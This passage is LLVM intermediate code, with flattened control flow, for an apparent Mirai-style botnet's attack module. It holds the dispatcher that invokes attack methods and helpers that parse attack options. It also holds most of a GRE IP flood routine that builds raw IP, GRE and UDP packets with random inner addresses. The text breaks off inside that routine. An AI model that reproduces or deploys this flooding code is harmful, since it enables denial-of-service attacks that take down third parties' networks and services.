  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %15, align 4
  %43 = load i8, i8* @methods_len, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp slt i32 %42, %44
  %46 = select i1 %45, i32 -94832185, i32 -2082822908
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %49 = load i32, i32* %15, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %48, i64 %50
  %52 = load %struct.attack_method*, %struct.attack_method** %51, align 8
  %53 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %52, i32 0, i32 1
  %54 = load i8, i8* %53, align 8
  %55 = zext i8 %54 to i32
  %56 = load i8, i8* %8, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %55, %57
  %59 = select i1 %58, i32 177763181, i32 381256514
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %62 = load i32, i32* %15, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %61, i64 %63
  %65 = load %struct.attack_method*, %struct.attack_method** %64, align 8
  %66 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %65, i32 0, i32 0
  %67 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %66, align 8
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %70 = load i8, i8* %11, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %67(i8 zeroext %68, %struct.attack_target* %69, i8 zeroext %70, %struct.attack_option* %71)
  store i32 -2082822908, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 1573802380, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %15, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %15, align 4
  store i32 245092529, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

loopEnd:                                          ; preds = %73, %72, %60, %47, %41, %40, %31, %25, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %.reg2mem = alloca %struct.attack_option*
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  store %struct.attack_option* %6, %struct.attack_option** %.reg2mem
  %switchVar = alloca i32
  store i32 -1420753208, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1420753208, label %first
    i32 1656904433, label %9
    i32 255806879, label %10
    i32 -1324766595, label %11
    i32 1330846758, label %16
    i32 -137976338, label %25
    i32 -1971952641, label %32
    i32 1092999332, label %33
    i32 -1772733137, label %36
    i32 -730592890, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.attack_option*, %struct.attack_option** %.reg2mem
  %7 = icmp eq %struct.attack_option* %.reload, null
  %8 = select i1 %7, i32 1656904433, i32 255806879
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i32 -730592890, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1324766595, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %5, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %12, %13
  %15 = select i1 %14, i32 1330846758, i32 -1772733137
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 0
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  %24 = select i1 %23, i32 -137976338, i32 -1971952641
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i64 %28
  %30 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %29, i32 0, i32 0
  %31 = load i8*, i8** %30, align 8
  call void @free(i8* %31) #6
  store i32 -1971952641, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 1092999332, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %5, align 4
  store i32 -1324766595, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  store i32 -730592890, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %36, %33, %32, %25, %16, %11, %10, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 888952931, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 888952931, label %11
    i32 1771282874, label %17
    i32 -1308488395, label %29
    i32 -1800877421, label %36
    i32 -592284617, label %37
    i32 -1003081917, label %40
    i32 -1730681778, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  %16 = select i1 %15, i32 1771282874, i32 -1003081917
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i64 %20
  %22 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %21, i32 0, i32 1
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %8, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  %28 = select i1 %27, i32 -1308488395, i32 -1800877421
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %31 = load i32, i32* %10, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %30, i64 %32
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %33, i32 0, i32 0
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %5, align 8
  store i32 -1730681778, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 -592284617, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %10, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %10, align 4
  store i32 888952931, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  store i32 -1730681778, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  ret i8* %43

loopEnd:                                          ; preds = %40, %37, %36, %29, %17, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -409489159, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -409489159, label %first
    i32 604827832, label %18
    i32 -1979849949, label %20
    i32 -1377367895, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 604827832, i32 -1979849949
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 -1377367895, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @util_atoi(i8* %21, i32 10)
  store i32 %22, i32* %5, align 4
  store i32 -1377367895, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 1853435380, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1853435380, label %first
    i32 1285693588, label %18
    i32 -1749196869, label %20
    i32 1186954674, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 1285693588, i32 -1749196869
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 1186954674, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @inet_addr(i8* %21) #6
  store i32 %22, i32* %5, align 4
  store i32 1186954674, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1808780088, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1808780088, label %first
    i32 408793655, label %79
    i32 59242047, label %80
    i32 -846700543, label %86
    i32 363001709, label %89
    i32 -494998527, label %90
    i32 2107609082, label %96
    i32 1321658051, label %147
    i32 -940799438, label %151
    i32 1949403916, label %201
    i32 -1339530761, label %205
    i32 -1429510648, label %214
    i32 -886016005, label %220
    i32 -1917794817, label %228
    i32 -1112613386, label %244
    i32 1962154335, label %247
    i32 -189694965, label %248
    i32 -2099721063, label %249
    i32 -1516798508, label %255
    i32 32162017, label %284
    i32 747712851, label %305
    i32 -269666178, label %309
    i32 -593371616, label %313
    i32 -1280160845, label %318
    i32 1654127326, label %333
    i32 -2033246374, label %338
    i32 303243365, label %344
    i32 -2130436692, label %349
    i32 311038388, label %355
    i32 -1170199100, label %359
    i32 -483590975, label %363
    i32 398043728, label %369
    i32 -1178338078, label %373
    i32 -294158401, label %376
    i32 -1475406472, label %443
    i32 1700582662, label %446
    i32 1915199974, label %447
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %77 = icmp eq i32 %.reload, -1
  %78 = select i1 %77, i32 408793655, i32 59242047
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 1915199974, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %81 = load i32, i32* %10, align 4
  %82 = bitcast i32* %9 to i8*
  %83 = call i32 @setsockopt(i32 %81, i32 0, i32 3, i8* %82, i32 4) #6
  %84 = icmp eq i32 %83, -1
  %85 = select i1 %84, i32 -846700543, i32 363001709
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = call i32 @close(i32 %87)
  store i32 1915199974, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -494998527, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %9, align 4
  %92 = load i8, i8* %5, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %91, %93
  %95 = select i1 %94, i32 2107609082, i32 1962154335
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %98 = load i8**, i8*** %11, align 8
  %99 = load i32, i32* %9, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8*, i8** %98, i64 %100
  store i8* %97, i8** %101, align 8
  %102 = load i8**, i8*** %11, align 8
  %103 = load i32, i32* %9, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8*, i8** %102, i64 %104
  %106 = load i8*, i8** %105, align 8
  %107 = bitcast i8* %106 to %struct.iphdr*
  store %struct.iphdr* %107, %struct.iphdr** %22, align 8
  %108 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %109 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %108, i64 1
  %110 = bitcast %struct.iphdr* %109 to %struct.grehdr*
  store %struct.grehdr* %110, %struct.grehdr** %23, align 8
  %111 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %112 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %111, i64 1
  %113 = bitcast %struct.grehdr* %112 to %struct.iphdr*
  store %struct.iphdr* %113, %struct.iphdr** %24, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i64 1
  %116 = bitcast %struct.iphdr* %115 to %struct.udphdr*
  store %struct.udphdr* %116, %struct.udphdr** %25, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %118 = bitcast %struct.iphdr* %117 to i8*
  %119 = load i8, i8* %118, align 4
  %120 = and i8 %119, 15
  %121 = or i8 %120, 64
  store i8 %121, i8* %118, align 4
  %122 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, -16
  %126 = or i8 %125, 5
  store i8 %126, i8* %123, align 4
  %127 = load i8, i8* %12, align 1
  %128 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 1
  store i8 %127, i8* %129, align 1
  %130 = load i32, i32* %18, align 4
  %131 = sext i32 %130 to i64
  %132 = add i64 52, %131
  %133 = trunc i64 %132 to i16
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %13, align 2
  %138 = call zeroext i16 @htons(i16 zeroext %137) #7
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 3
  store i16 %138, i16* %140, align 4
  %141 = load i8, i8* %14, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 5
  store i8 %141, i8* %143, align 4
  %144 = load i8, i8* %15, align 1
  %145 = icmp ne i8 %144, 0
  %146 = select i1 %145, i32 1321658051, i32 -940799438
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 4
  store i16 %148, i16* %150, align 2
  store i32 -940799438, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 6
  store i8 47, i8* %153, align 1
  %154 = load i32, i32* %21, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 8
  store i32 %154, i32* %156, align 4
  %157 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %158 = load i32, i32* %9, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 1
  %162 = load i32, i32* %161, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 9
  store i32 %162, i32* %164, align 4
  %165 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %166 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %167 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %169 = bitcast %struct.iphdr* %168 to i8*
  %170 = load i8, i8* %169, align 4
  %171 = and i8 %170, 15
  %172 = or i8 %171, 64
  store i8 %172, i8* %169, align 4
  %173 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %174 = bitcast %struct.iphdr* %173 to i8*
  %175 = load i8, i8* %174, align 4
  %176 = and i8 %175, -16
  %177 = or i8 %176, 5
  store i8 %177, i8* %174, align 4
  %178 = load i8, i8* %12, align 1
  %179 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 1
  store i8 %178, i8* %180, align 1
  %181 = load i32, i32* %18, align 4
  %182 = sext i32 %181 to i64
  %183 = add i64 28, %182
  %184 = trunc i64 %183 to i16
  %185 = call zeroext i16 @htons(i16 zeroext %184) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 2
  store i16 %185, i16* %187, align 2
  %188 = load i16, i16* %13, align 2
  %189 = zext i16 %188 to i32
  %190 = xor i32 %189, -1
  %191 = trunc i32 %190 to i16
  %192 = call zeroext i16 @htons(i16 zeroext %191) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 3
  store i16 %192, i16* %194, align 4
  %195 = load i8, i8* %14, align 1
  %196 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 5
  store i8 %195, i8* %197, align 4
  %198 = load i8, i8* %15, align 1
  %199 = icmp ne i8 %198, 0
  %200 = select i1 %199, i32 1949403916, i32 -1339530761
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 4
  store i16 %202, i16* %204, align 2
  store i32 -1339530761, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 6
  store i8 17, i8* %207, align 1
  %208 = call i32 @rand_next()
  %209 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 8
  store i32 %208, i32* %210, align 4
  %211 = load i8, i8* %20, align 1
  %212 = icmp ne i8 %211, 0
  %213 = select i1 %212, i32 -1429510648, i32 -886016005
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 9
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  store i32 -1917794817, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 8
  %223 = load i32, i32* %222, align 4
  %224 = sub i32 %223, 1024
  %225 = xor i32 %224, -1
  %226 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  store i32 -1917794817, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
